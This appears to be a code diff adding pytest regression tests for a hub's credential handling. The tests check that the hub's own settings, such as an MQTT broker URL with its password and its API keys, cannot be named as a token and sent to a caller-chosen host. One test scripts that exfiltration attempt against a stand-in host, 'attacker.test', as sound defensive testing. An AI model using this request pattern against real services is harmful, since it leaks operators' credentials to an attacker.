@@ -468,6 +468,46 @@ def test_a_local_server_is_asked_for_its_models_without_a_key(api, fake):
     assert all("authorization" not in q.headers for q in fake.seen)
 
 
+HUB_SETTINGS = {"SATELLITES_MQTT_URL": "mqtt://user:broker-password@broker.test:1883",
+                "SATELLITES_API_KEYS": "hub-key-one,hub-key-two",
+                "NODES_MQTT_URL": "mqtt://user:old-password@broker.test:1883"}
+
+
+@pytest.mark.parametrize("name", sorted(HUB_SETTINGS))
+def test_the_hubs_own_settings_are_never_sent_as_a_key(api, fake, monkeypatch, name):
+    """Any variable's value went out as a bearer token to an address the
+    caller chose, on one request and without saving anything: the broker's
+    URL with its password, the hub's own API keys. A name under the hub's
+    prefix that does not end in _TOKEN or _KEY is its configuration, refused
+    wherever a key's name is taken and never resolved."""
+    for var, value in HUB_SETTINGS.items():
+        monkeypatch.setenv(var, value)
+    fake.handlers["attacker.test"] = lambda r: httpx.Response(200, json={"data": []})
+    asked = [api.post("/satellites/llm/models", json={"base_url": "https://attacker.test/v1",
+                                                      "api_key_env": name}),
+             api.post("/satellites/llm/test", json=LLM | {"base_url": "https://attacker.test/v1",
+                                                         "api_key_env": name}),
+             api.post("/satellites/ha/pipelines", json={"url": "https://attacker.test",
+                                                        "token_env": name})]
+    for r in asked:
+        assert r.status_code == 422, r.text
+        assert "one of the hub's own settings" in r.text and HUB_SETTINGS[name] not in r.text
+    assert fake.seen == []
+    assert destinations._held(name) is None
+    with pytest.raises(ValueError, match="hub's own settings"):
+        Llm.model_validate(LLM | {"api_key_env": name})
+
+
+def test_a_credential_under_the_hubs_prefix_is_still_a_key():
+    for name in ("SATELLITES_HA_TOKEN", "SATELLITES_LLM_API_KEY", "SATELLITES_WEBHOOK_TOKEN",
+                 "SATELLITES_HA_TOKEN_KITCHEN", "SATELLITES_TOKEN", "NODES_HA_TOKEN",
+                 "OPENROUTER_API_KEY", "MY_SERVER"):
+        assert not destinations.hub_setting(name), name
+    for name in ("SATELLITES_MQTT_URL", "SATELLITES_API_KEYS", "SATELLITES_DATA_DIR",
+                 "SATELLITES_FIRMWARE_PUBKEY", "NODES_API_KEYS", "SATELLITES_KEYSTONE"):
+        assert destinations.hub_setting(name), name
+
+
 def paged(ids: list[str], size: int = 20):
     """A server that pages its /models as Anthropic's does: `size` at a time
     unless asked for up to 1000, from after_id, with has_more and last_id."""
